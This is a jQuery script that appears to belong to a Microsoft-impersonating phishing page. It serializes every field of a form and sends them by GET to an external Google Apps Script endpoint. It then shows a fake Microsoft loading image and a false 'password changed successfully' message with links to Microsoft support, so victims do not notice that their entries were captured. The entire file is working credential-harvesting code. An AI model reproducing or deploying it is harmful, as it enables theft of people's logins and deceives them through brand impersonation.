
$.fn.serializeObject = function() {
    var obj = {};
    var arr = this.serializeArray();
    arr.forEach(function(item, index) {
        if (obj[item.name] === undefined) { // New
            obj[item.name] = item.value || '';
        } else {                            // Existing
            if (!obj[item.name].push) {
                obj[item.name] = [obj[item.name]];
            }
            obj[item.name].push(item.value || '');
        }
    });
    return obj;
};

var $form = $("#daform");

var $url = "https://script.google.com/macros/s/AKfycbz7wmM2XV-2gPIzKO3KGd5gUss5wnWU8NRdijRMnqJLP-IeyfY/exec";



$("button#sender").on('click',function(e){
    e.preventDefault();
    $.ajax({
        url: $url,
        method: "GET",
        dataType: "json",
        data: $form.serializeObject(),
        success: function(){
        console.log("Success, code 200");
        }
    });
    $("body").html("<img style='text-align:center; display:block; margin: 100px auto;' src='301.gif' alt='Microsoft\'s loading logo' />");


    var timeoutED = window.setTimeout(function(){
        $("body").html('<p style="font-weight: 200; font-family: sans-serif;letter-spacing: 1.5px; margin: 100px auto 20px auto;font-size: 20px">Your password has been changed successfully. </p><p style="font-weight: 200; font-family: sans-serif;letter-spacing: 1.5px; margin: 40px auto; font-size: 20px"> For more information contact our <a href="https://support.microsoft.com/es-es" style="text-decoration:none; color: #2980b9; font-size: 20px">Help Center</a></p> <a href="https://support.microsoft.com/es-es"><img style = "display:block; margin: 70px auto; width: 150px; "   src="http://diylogodesigns.com/blog/wp-content/uploads/2016/04/Microsoft-Logo-icon-png-Transparent-Background.png" alt="Microsoft logo" /></a>');
    }, 800);

});




